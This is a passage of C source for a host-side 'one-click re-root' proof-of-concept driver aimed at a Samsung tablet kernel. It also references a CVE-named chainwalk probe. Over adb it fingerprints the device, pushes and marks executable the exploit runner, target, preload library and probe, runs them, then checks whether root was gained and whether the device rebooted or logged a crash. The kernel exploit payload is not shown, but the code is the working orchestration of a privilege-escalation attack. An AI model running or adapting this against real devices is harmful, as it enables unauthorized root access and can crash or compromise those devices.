  setvbuf(stdout, NULL, _IOLBF, 0);
  signal(SIGINT, on_signal);
  signal(SIGTERM, on_signal);
#ifndef _WIN32
  signal(SIGHUP, on_signal);
#endif

  char repo_root[PATH_MAX];
  if (options.repo_root) {
    if (!resolve_path(options.repo_root, repo_root, sizeof(repo_root))) {
      perror("realpath repo root");
      return 2;
    }
  } else if (derive_repo_root(argv[0], repo_root, sizeof(repo_root)) != 0) {
    if (!getcwd(repo_root, sizeof(repo_root))) {
      perror("getcwd");
      return 2;
    }
  }

  char result_dir[PATH_MAX];
  if (options.result_dir) {
    if (strlen(options.result_dir) >= sizeof(result_dir)) {
      fprintf(stderr, "result directory too long\n");
      return 2;
    }
    strcpy(result_dir, options.result_dir);
  } else {
    char relative[PATH_MAX];
    make_default_result_dir(relative, sizeof(relative));
    if (join_path(result_dir, sizeof(result_dir), repo_root, relative) != 0) {
      fprintf(stderr, "result directory too long\n");
      return 2;
    }
  }
  if (mkdir_p(result_dir, 0755) != 0) {
    perror("mkdir result dir");
    return 2;
  }
  char log_path[PATH_MAX];
  snprintf(log_path, sizeof(log_path), "%s/reroot.log", result_dir);
  int log_fd = open(log_path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0644);
  if (log_fd < 0) {
    perror("open log");
    return 2;
  }

  char default_device_runner[PATH_MAX];
  char default_target[PATH_MAX];
  char default_preload[PATH_MAX];
  char default_probe[PATH_MAX];
  join_path(default_device_runner, sizeof(default_device_runner), repo_root,
            "build/ionstack_reroot_device");
  join_path(default_target, sizeof(default_target), repo_root,
            "build/ionstack_perf_target");
  join_path(default_preload, sizeof(default_preload), repo_root,
            "build/ionstack_preload.so");
  join_path(default_probe, sizeof(default_probe), repo_root,
            "build/cve_2026_43499_chainwalk_probe_arm32");
  const char *device_runner =
      options.device_runner ? options.device_runner : default_device_runner;
  const char *target = options.target ? options.target : default_target;
  const char *preload = options.preload ? options.preload : default_preload;
  const char *probe = options.probe ? options.probe : default_probe;
  char kernel_build_sh[PATH_MAX];
  char vendor_defconfig[PATH_MAX];
  char out_config[PATH_MAX];
  char rtmutex_common_h[PATH_MAX];
  char rtmutex_h[PATH_MAX];
  char sched_h[PATH_MAX];
  char asm_offsets_s[PATH_MAX];
  char candidate_vmlinux[PATH_MAX];
  char candidate_system_map[PATH_MAX];
  char alternate_vmlinux[PATH_MAX];
  char alternate_system_map[PATH_MAX];
  struct gate_state gates = {0};

  snprintf(kernel_build_sh, sizeof(kernel_build_sh), "%s/../Kernel/build_kernel.sh",
           repo_root);
  snprintf(vendor_defconfig, sizeof(vendor_defconfig),
           "%s/../Kernel/vendor/gts7l_usa_singlew_defconfig", repo_root);
  snprintf(out_config, sizeof(out_config), "%s/../android_kernel_samsung_gts7l/out/.config",
           repo_root);
  snprintf(rtmutex_common_h, sizeof(rtmutex_common_h),
           "%s/../android_kernel_samsung_gts7l/kernel/locking/rtmutex_common.h",
           repo_root);
  snprintf(rtmutex_h, sizeof(rtmutex_h),
           "%s/../android_kernel_samsung_gts7l/include/linux/rtmutex.h",
           repo_root);
  snprintf(sched_h, sizeof(sched_h),
           "%s/../android_kernel_samsung_gts7l/include/linux/sched.h",
           repo_root);
  snprintf(asm_offsets_s, sizeof(asm_offsets_s),
           "%s/../android_kernel_samsung_gts7l/out/arch/arm64/kernel/asm-offsets.s",
           repo_root);
  snprintf(candidate_vmlinux, sizeof(candidate_vmlinux),
           "%s/../android_kernel_samsung_gts7l/out/vmlinux", repo_root);
  snprintf(candidate_system_map, sizeof(candidate_system_map),
           "%s/../android_kernel_samsung_gts7l/out/System.map", repo_root);
  snprintf(alternate_vmlinux, sizeof(alternate_vmlinux),
           "%s/../Kernel/out/vmlinux", repo_root);
  snprintf(alternate_system_map, sizeof(alternate_system_map),
           "%s/../Kernel/out/System.map", repo_root);
  gates.abi_gate =
      path_exists(candidate_vmlinux) || path_exists(alternate_vmlinux);
  finalize_gate_state(&gates);

  printf("[host] smt878u-ionstack-poc pure-C one-click re-root\n");
  printf("[host] result_dir=%s\n", result_dir);
  dprintf(log_fd, "[host] repo_root=%s\n[host] result_dir=%s\n", repo_root,
          result_dir);

  struct run_result state =
      run_adb(&options, log_fd, 10000, 1, "get-state", NULL);
  if (state.exit_code != 0 || !state.output || !strstr(state.output, "device")) {
    fprintf(stderr, "[host] adb device is not ready\n");
    free_run_result(&state);
    close(log_fd);
    return 1;
  }
  free_run_result(&state);

  struct run_result boot_before = run_adb(
      &options, log_fd, 10000, 0, "shell",
      "cat /proc/sys/kernel/random/boot_id", NULL);
  printf("[host] boot_id=%s", boot_before.output ? boot_before.output : "?\n");
  log_path_status(log_fd, "local_kernel_build_sh", kernel_build_sh);
  log_path_status(log_fd, "local_vendor_defconfig", vendor_defconfig);
  log_path_status(log_fd, "local_out_config", out_config);
  log_path_status(log_fd, "local_rtmutex_common_h", rtmutex_common_h);
  log_path_status(log_fd, "local_rtmutex_h", rtmutex_h);
  log_path_status(log_fd, "local_sched_h", sched_h);
  log_path_status(log_fd, "local_asm_offsets_s", asm_offsets_s);
  log_path_status(log_fd, "candidate_vmlinux", candidate_vmlinux);
  log_path_status(log_fd, "candidate_system_map", candidate_system_map);
  log_path_status(log_fd, "alternate_vmlinux", alternate_vmlinux);
  log_path_status(log_fd, "alternate_system_map", alternate_system_map);
  log_gate_state_host(log_fd, &options, &gates);

  printf("[host] collect_device_identity\n");
  dprintf(log_fd, "[host] collect_device_identity\n");
  struct run_result device_identity = run_shell_command(
      &options, log_fd, 10000, 1,
      "echo fingerprint=$(getprop ro.build.fingerprint); "
      "echo incremental=$(getprop ro.build.version.incremental); "
      "echo bootloader=$(getprop ro.bootloader); "
      "echo device=$(getprop ro.product.device); "
      "uname -a");
  struct run_result device_config = run_shell_command(
      &options, log_fd, 10000, 1,
      "if [ -r /proc/config.gz ]; then "
      "(zcat /proc/config.gz 2>/dev/null || gzip -dc /proc/config.gz 2>/dev/null || "
      "echo CONFIG_READ_TOOL_MISSING) | "
      "grep -E '^(CONFIG_RT_MUTEXES|CONFIG_DEBUG_INFO|CONFIG_FTRACE|CONFIG_KALLSYMS|CONFIG_PSTORE|CONFIG_PSTORE_RAM)='; "
      "else "
      "echo CONFIG_GZ_UNREADABLE; "
      "fi");
  struct run_result pstore_before =
      capture_pstore_snapshot(&options, log_fd, "before");

  char *existing_output = NULL;
  if (!options.force && !options.preflight_only && !options.validate_only &&
      !options.observe_only &&
      remote_root_check(&options, log_fd, &existing_output)) {
    printf("[host] already rooted: %s", existing_output);
    printf("[host] SUCCESS already_root=1 log=%s\n", log_path);
    dprintf(log_fd, "[host] SUCCESS already_root=1\n");
    free(existing_output);
    free_run_result(&pstore_before);
    free_run_result(&device_config);
    free_run_result(&device_identity);
    free_run_result(&boot_before);
    close(log_fd);
    return 0;
  }
  free(existing_output);

  if (!options.force && !options.preflight_only && !options.validate_only &&
      !options.observe_only && !gates.write_gate) {
    log_no_go_host(log_fd, &options, &gates, "host-gate");
    printf("[host] FAIL log=%s\n", log_path);
    free_run_result(&pstore_before);
    free_run_result(&device_config);
    free_run_result(&device_identity);
    free_run_result(&boot_before);
    close(log_fd);
    return 1;
  }

  if (!options.no_deploy) {
    struct artifact_spec {
      const char *local;
      const char *remote;
      int required;
      int executable;
    } artifacts[] = {
        {device_runner, REMOTE_DEVICE_RUNNER, 1, 1},
        {target, REMOTE_TARGET, !options.preflight_only, 1},
        {preload, REMOTE_PRELOAD, !options.preflight_only, 0},
        {probe, REMOTE_PROBE,
         !options.preflight_only && !options.validate_only && options.legacy_route &&
             (!options.observe_only || options.allow_weak_holder),
         1},
    };
    for (size_t i = 0; i < sizeof(artifacts) / sizeof(artifacts[0]); ++i) {
      if (!artifacts[i].required) {
        continue;
      }
      if (!file_is_regular(artifacts[i].local)) {
        fprintf(stderr, "[host] missing local artifact: %s\n", artifacts[i].local);
        free_run_result(&pstore_before);
        free_run_result(&device_config);
        free_run_result(&device_identity);
        free_run_result(&boot_before);
        close(log_fd);
        return 1;
      }
      if (push_artifact(&options, log_fd, artifacts[i].local, artifacts[i].remote) != 0) {
        fprintf(stderr, "[host] push failed: %s\n", artifacts[i].local);
        free_run_result(&pstore_before);
        free_run_result(&device_config);
        free_run_result(&device_identity);
        free_run_result(&boot_before);
        close(log_fd);
        return 1;
      }
      if (artifacts[i].executable) {
        struct run_result chmod_result = run_adb(
            &options, log_fd, 10000, 1, "shell", "chmod", "755",
            artifacts[i].remote, NULL);
        if (chmod_result.exit_code != 0) {
          fprintf(stderr, "[host] remote chmod failed for %s\n",
                  artifacts[i].remote);
          free_run_result(&chmod_result);
          free_run_result(&pstore_before);
          free_run_result(&device_config);
          free_run_result(&device_identity);
          free_run_result(&boot_before);
          close(log_fd);
          return 1;
        }
        free_run_result(&chmod_result);
      }
    }
  }

  printf("[host] starting device orchestrator\n");
  dprintf(log_fd, "[host] starting device orchestrator\n");
  struct run_result reroot = run_device_runner(&options, log_fd, &gates);

  int device_ready_after =
      wait_for_device_ready(&options, log_fd, options.observe_only ? 180000U : 120000U);
  printf("[host] device_ready_after=%d\n", device_ready_after);
  dprintf(log_fd, "[host] device_ready_after=%d\n", device_ready_after);

  struct run_result boot_after =
      run_adb(&options, log_fd, 10000, 0, "shell",
              "cat /proc/sys/kernel/random/boot_id", NULL);
  struct run_result pstore_after =
      capture_pstore_snapshot(&options, log_fd, "after");
  int boot_before_ok =
      boot_before.exit_code == 0 && !boot_before.timed_out && boot_before.output;
  int boot_after_ok =
      boot_after.exit_code == 0 && !boot_after.timed_out && boot_after.output;
  int same_boot =
      boot_before_ok && boot_after_ok &&
      strcmp(boot_before.output, boot_after.output) == 0;
  int pstore_present_after = pstore_has_entries(&pstore_after);
  struct run_result boot_context_after = {0};
  int captured_boot_context = 0;
  if (!same_boot || pstore_present_after || reroot.timed_out) {
    const char *context_phase =
        !same_boot ? "after-reboot" : (pstore_present_after ? "after-pstore"
                                                            : "after-timeout");
    boot_context_after =
        capture_boot_context_snapshot(&options, log_fd, context_phase);
    captured_boot_context = 1;
  }
  char *verify_output = NULL;
  int root_ok = 0;
  const char *expected_marker = "[reroot] SUCCESS";
  if (options.preflight_only) {
    expected_marker = "[reroot] PREFLIGHT_OK";
  } else if (options.validate_only) {
    expected_marker = "[reroot] VALIDATION_OK";
  } else if (options.observe_only) {
    expected_marker = "[reroot] OBSERVATION_OK";
  } else {
    root_ok = remote_root_check(&options, log_fd, &verify_output);
  }
  int marker_ok =
      reroot.output && strstr(reroot.output, expected_marker) != NULL;
  int blocked_abi =
      reroot.output && strstr(reroot.output, "blocked_abi") != NULL;
  int blocked_overlap =
      reroot.output && strstr(reroot.output, "blocked_overlap") != NULL;
  int blocked_identity =
      reroot.output && strstr(reroot.output, "blocked_identity") != NULL;
  int blocked_consumer =
      reroot.output && strstr(reroot.output, "blocked_consumer") != NULL;
  int trace_unavailable =
      reroot.output && strstr(reroot.output, "trace_unavailable") != NULL;
  int no_go = reroot.output && strstr(reroot.output, "no_go") != NULL;
  int reboot_no_pstore =
      options.observe_only && boot_before_ok && boot_after_ok && !same_boot &&
      !pstore_present_after;

  printf("[host] device_rc=%d timed_out=%d same_boot=%d\n", reroot.exit_code,
         reroot.timed_out, same_boot);
  if (boot_before_ok && boot_after_ok && !same_boot) {
    printf("[host] reboot_detected pstore_present=%d before=%safter=%s",
           pstore_present_after, boot_before.output, boot_after.output);
    dprintf(log_fd,
            "[host] reboot_detected pstore_present=%d before=%safter=%s",
            pstore_present_after, boot_before.output, boot_after.output);
  }
  if (verify_output && *verify_output) {
    printf("[host] verify: %s", verify_output);
  }
  int root_requirement_ok =
      options.preflight_only || options.validate_only || options.observe_only ||
      root_ok;
  int success;
  if (options.observe_only) {
    success = marker_ok || trace_unavailable || blocked_consumer ||
              reboot_no_pstore;
  } else {
    success = reroot.exit_code == 0 && !reroot.timed_out && marker_ok &&
              root_requirement_ok && same_boot;
  }
  printf("[host] final success=%d device_rc=%d timed_out=%d marker=%d "
         "root=%d same_boot=%d blocked_abi=%d blocked_overlap=%d "
         "blocked_identity=%d blocked_consumer=%d trace_unavailable=%d "
         "reboot_no_pstore=%d no_go=%d device_ready_after=%d\n",
         success, reroot.exit_code, reroot.timed_out, marker_ok, root_ok,
         same_boot, blocked_abi, blocked_overlap, blocked_identity,
         blocked_consumer, trace_unavailable, reboot_no_pstore, no_go,
         device_ready_after);
  printf("[host] %s log=%s\n", success ? "SUCCESS" : "FAIL", log_path);
  dprintf(log_fd,
          "[host] final success=%d device_rc=%d timed_out=%d marker=%d "
          "root=%d same_boot=%d blocked_abi=%d blocked_overlap=%d "
          "blocked_identity=%d blocked_consumer=%d trace_unavailable=%d "
          "reboot_no_pstore=%d no_go=%d device_ready_after=%d\n",
          success, reroot.exit_code, reroot.timed_out, marker_ok, root_ok,
          same_boot, blocked_abi, blocked_overlap, blocked_identity,
          blocked_consumer, trace_unavailable, reboot_no_pstore, no_go,
          device_ready_after);

  free(verify_output);
  if (captured_boot_context) {
    free_run_result(&boot_context_after);
  }
  free_run_result(&pstore_after);
  free_run_result(&pstore_before);
  free_run_result(&device_config);
  free_run_result(&device_identity);
  free_run_result(&boot_before);
  free_run_result(&boot_after);
  free_run_result(&reroot);
  close(log_fd);
  if (interrupted) {
    return 128 + interrupted;
  }
  return success ? 0 : 1;
}
